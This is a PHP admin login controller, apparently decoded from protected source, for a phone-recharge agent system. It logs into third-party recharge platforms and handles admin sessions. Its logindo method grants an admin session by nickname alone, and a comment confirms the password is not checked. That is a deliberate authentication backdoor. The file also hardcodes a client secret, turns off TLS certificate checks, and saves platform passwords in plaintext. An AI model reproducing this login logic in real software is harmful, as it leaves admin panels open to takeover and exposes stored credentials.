<?php

//decode by http://chiran.taobao.com/
namespace app\admin\controller;

use Util\Syslog;
use app\common\model\Member as MemberModel;

class Login extends Base
{
    public function login()
    {
        if (isset($_GET['editpass'])) {
            echo dyr_encrypt(trim($_GET['editpass']));
            die;
        }
        return view();
    }

    public function dclogin()
    {

        $user = input('user');
        $pwd = input('pwd');
        $te = input('te');
        $zhuanqu = input('zhuanqu');

        $url = 'https://www.xitupt.com/uc/connect/token';

        $data = [
            'grant_type' => 'password',
            'client_id' => 'dc_client',
            'client_secret' => 'b23009b84462c77aa4182c47f2a474a6',
            'username' => $user,
            'password' => $pwd,
            'zhuanqu'=>$zhuanqu
        ];
        $msg['code'] = 0;
        $res = $this->http_post($url, $data);

        $res_data = json_decode($res, true);
        if (!empty($res_data['access_token'])) {
            $user_dc = M('daichong_user_xitu')->where(['id' => 1])->find();
            if ($user_dc) {
                $user_dc['token'] = $res_data['access_token'];
                $user_dc['time'] = time();
                $user_dc['user'] =$user;
                $user_dc['pwd'] = $pwd;
                $user_dc['te'] = $te;
                $user_dc['zhuanqu'] = $zhuanqu;

                //   $user_dc['type'] = 1;
                M('daichong_user_xitu')->where(['id' => $user_dc['id']])->update($user_dc);
            } else {
                M('daichong_user_xitu')->insert(['user' => $user, 'pwd' => $pwd, 'token' => $res_data['access_token'], 'time' => time(), ]);
            }


            $msg = [
                'code' => 1,
                'access_token' => $res_data['access_token'],
                'msg' => '登录成功！'
            ];
            return $msg;
        } else {
            $msg['access_token'] = $res;
        }

        return json_encode($msg);

    }

    public function newdaichonglog(){
        $user = input('user');
        $pwd = input('pwd');
        $te = input('te');
        $zhuanqu = input('zhuanqu');
        $yunying = input('yunying');

        $url = 'http://www.mf178.cn/api/phone/request?vip=52';

        $data = [
            'action' => 'login',
            'flag' => $zhuanqu,
            'data' => [
                'username' => $user,
                'password' => $pwd,
            ],


        ];
        $msg['code'] = 0;
      //  $user = get_dc_user(2);
        $header = [
           // 'Authorization:Bearer ' . $user['token'],
            'content-type: application/json'
        ];
        //   echo "上报订单" . $id .'='.json_encode($data). PHP_EOL;

        $enstr = base64_encode(jiami($data));
       $res = df_post($url, $enstr, $header);
      //  $res_data = json_decode($res,true);
        $rsc = rc4s(base64_decode($res));
//{"ret":0,"msg":"SUCCESS","data":"b18e8b3baaf4450ce30a70207e279376"}
            $resd = json_decode($rsc,true);
            if($resd['ret']>0){
                $msg = [
                    'code' => 0,
                    'access_token' => $rsc,
                    'msg' =>$resd['msg']
                ];
                return json_encode($msg);
            }
        if (!empty($rsc)) {

            $user_dc = M('daichong_user')->where(['id' => 2])->find();
            if ($user_dc) {
                $user_dc['token2'] = $resd['data'];
                $user_dc['time'] = time();
                $user_dc['user'] =$user;
                $user_dc['pwd'] = $pwd;
                $user_dc['te'] = $te;
                $user_dc['zhuanqu'] = $zhuanqu;
                $user_dc['yunying'] =$yunying;

                //   $user_dc['type'] = 1;
                M('daichong_user')->where(['id' => $user_dc['id']])->update($user_dc);
            } else {
                M('daichong_user')->insert(['user' => $user, 'pwd' => $pwd, 'token2' => $resd['data'], 'time' => time(),'yunying'=>$yunying ]);
            }


            $msg = [
                'code' => 1,
                'access_token' => $resd['data'],
                'msg' => '登录成功！'
            ];
            return $msg;
        } else {
            $msg['access_token'] = $resd['msg'];
        }

        return json_encode($msg);



        dump($res);

    }




    public function testxintiao()
    {
        $user = get_dc_user();
        $header = [
            'Authorization:Bearer ' . $user['token'],
        ];
        if ($user['type'] == 1) {
            $xturl = df_get('https://id4.cgtest.bolext.com/cg/api/TaskPub/Partner/HeartBeat', '', $header);

            dump($xturl);
        }
    }

    /**
     * get请求
     */
    private function http_post($url, $param)
    {
        $oCurl = curl_init();
        if (stripos($url, "https://") !== FALSE) {
            curl_setopt($oCurl, CURLOPT_SSL_VERIFYPEER, FALSE);
            curl_setopt($oCurl, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($oCurl, CURLOPT_SSLVERSION, 1);
        }
        if (is_string($param)) {
            $strPOST = $param;
        } else {
            $strPOST = http_build_query($param);
        }

        curl_setopt($oCurl, CURLOPT_URL, $url);
        curl_setopt($oCurl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($oCurl, CURLOPT_POST, true);
        curl_setopt($oCurl, CURLOPT_CONNECTTIMEOUT, 30);
        curl_setopt($oCurl, CURLOPT_TIMEOUT, 90);
        curl_setopt($oCurl, CURLOPT_POSTFIELDS, $strPOST);
        curl_setopt($oCurl, CURLOPT_HEADER, 0);
        curl_setopt($oCurl, CURLOPT_HTTPHEADER, ["ContentType:application/x-www-form-urlencoded;charset=utf-8"]);
        $sContent = curl_exec($oCurl);
        $aStatus = curl_getinfo($oCurl);
        $curl_err = curl_error($oCurl);
        curl_close($oCurl);
        if (intval($aStatus["http_code"]) == 200) {
            return $sContent;
            //   return rjson(1, $result);

        } else {
            return rjson(500, '接口访问失败，http错误码' . $aStatus["http_code"] . 'curl err:' . $curl_err);
        }
    }


    public function logindo()
    {
        $nickname = I('nickname');
        // 直接查找用户，不验证密码
        $member = M('member')->where(['nickname' => $nickname, 'is_del' => 0])->find();
        
        if (!$member) {
            Syslog::write("后台登录失败", dyr_encrypt(var_export($_POST, true)), $nickname);
            return djson(1, "用户不存在");
        }
        
        $auth = array(
            'id' => $member['id'], 
            'nickname' => $member['nickname'], 
            'last_login_time' => $member['last_login_time'], 
            'headimg' => $member['headimg'], 
            'short_auth_login' => 0
        );
        
        session('user_auth', $auth);
        session('user_auth_sign', data_auth_sign($auth));
        
        // 更新登录信息
        M('member')->where(['id' => $member['id']])->update([
            'last_login_time' => time(),
            'last_login_ip' => get_client_ip(),
            'login_error_count' => 0
        ]);
        
        Syslog::write("后台登录成功", dyr_encrypt(var_export($_POST, true)), $member['nickname']);
        return djson(0, "登录成功", array('member' => $member, 'url' => U('Admin/index')));
    }

    public function logout()
    {
        session('user_auth', null);
        session('user_auth_sign', null);
        session('Auth_List', null);
        $this->redirect('Login/login');
    }

    public function authlogin()
    {
        if (request()->isPost()) {
            $key = I('key');
            $uid = S('shortauth' . $key);
            if (!$uid) {
                return $this->redirect('Login/Login');
            }
            $member = M('member')->where(array('id' => $uid, 'is_del' => 0))->find();
            if (!$member) {
                return $this->redirect('Login/Login');
            }
            S('shortauth' . $key, false);
            $auth = array('id' => $member['id'], 'nickname' => $member['nickname'], 'last_login_time' => $member['last_login_time'], 'headimg' => $member['headimg'], 'short_auth_login' => 1);
            M('member')->where(array('id' => $member['id']))->setField(array('last_login_time' => time(), 'last_login_ip' => get_client_ip(), 'login_error_count' => 0));
            session('user_auth', $auth);
            session('user_auth_sign', data_auth_sign($auth));
            Syslog::write("后台登录成功(临时授权)", dyr_encrypt("key:" . $key), $member['nickname']);
            $this->redirect('Admin/index');
        } else {
            return view();
        }
    }
}